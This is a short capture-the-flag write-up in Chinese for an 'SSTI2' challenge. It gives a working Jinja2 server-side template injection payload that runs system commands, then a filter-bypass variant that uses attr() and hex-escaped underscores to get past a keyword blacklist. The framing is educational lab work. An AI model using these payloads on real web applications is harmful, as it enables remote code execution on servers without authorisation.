## SSTI2

![Screenshot_2025-05-21_00-50-47](https://github.com/user-attachments/assets/15e13182-7f12-4186-b131-0ddf72b10968)
![Screenshot_2025-05-21_00-51-13](https://github.com/user-attachments/assets/7922c3ba-d8f1-4fed-9fe0-c536d7eb2d94)

### 初步嘗試
我使用了典型的 Python Jinja2 RCE payload 嘗試取得系統資訊
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
伺服器回傳
![Screenshot_2025-05-21_00-56-51](https://github.com/user-attachments/assets/aced685a-8f45-4509-a72c-72fa44fd337d)

多次嘗試後發現
- 幾乎所有關鍵字或符號都被過濾：像是 `__`, `.`, `[`, `]`, `|` 等
- 常見的 Python 關鍵字如 `join`, `mro`, `base` 等也被攔截
表示伺服器存在黑名單機制
運用了 @SecGus 在 GitHub 上的技巧：
📌 參考資料：[PayloadsAllTheThings - SSTI Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
關鍵概念是：
- 使用 `attr()` 函式來取代點記法；
- 用十六進位表示字串（例如 `__` → `\x5f\x5f`）來繞過字元過濾。
統整出
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
運作原理如下：

1. 透過 `request` 取得 `application` 對象；
2. 進入其 `__globals__`；
3. 從中找到 `__builtins__`，再透過 `__import__` 載入 `os` 模組；
4. 執行 `os.popen('id').read()`，執行系統命令並回傳輸出。

![Screenshot_2025-05-21_01-05-23](https://github.com/user-attachments/assets/49e44d53-f16d-4c45-8c46-bb7aeeb38524)

得到flag
